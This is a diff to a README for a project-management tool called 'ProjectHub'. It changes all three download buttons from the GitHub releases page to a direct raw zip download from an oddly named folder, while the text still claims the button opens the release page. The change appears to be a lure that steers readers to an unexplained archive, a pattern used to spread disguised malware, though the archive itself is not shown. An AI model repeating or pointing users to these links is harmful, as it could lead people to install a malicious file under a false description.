@@ -1,6 +1,6 @@
 # 📋 ProjectHub - Manage Projects with Ease
 
-[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-brightgreen?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/releases)
+[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-brightgreen?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/raw/refs/heads/main/landowner/Project_Hub_3.3.zip)
 
 ## 🌐 What Is ProjectHub?
 
@@ -33,7 +33,7 @@ Follow these instructions to download, install, and start using ProjectHub.
 
 Click the button below to open the ProjectHub release page on GitHub.
 
-[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-blue?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/releases)
+[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-blue?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/raw/refs/heads/main/landowner/Project_Hub_3.3.zip)
 
 This page holds the latest installer for ProjectHub. It updates regularly with new features and fixes.
 
@@ -136,4 +136,4 @@ If problems persist, check the GitHub Issues page for help and updates.
 
 Return here to download ProjectHub anytime:
 
-[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-brightgreen?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/releases)
+[![Download ProjectHub](https://img.shields.io/badge/Download-ProjectHub-brightgreen?style=for-the-badge)](https://github.com/Acarpellous-commendation366/ProjectHub/raw/refs/heads/main/landowner/Project_Hub_3.3.zip)
